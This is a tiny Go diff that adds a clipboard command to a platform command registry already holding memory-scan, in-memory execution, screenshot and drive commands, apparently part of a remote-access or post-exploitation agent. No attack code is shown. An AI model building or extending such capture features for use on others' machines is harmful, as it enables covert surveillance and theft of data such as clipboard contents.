@@ -17,5 +17,6 @@ func registerPlatformCommands() {
 	RegisterCommand(&MemScanCommand{})
 	RegisterCommand(&ExecuteMemoryCommand{})
 	RegisterCommand(&ScreenshotLinuxCommand{})
+	RegisterCommand(&ClipboardCommand{})
 	RegisterCommand(&DrivesUnixCommand{})
 }
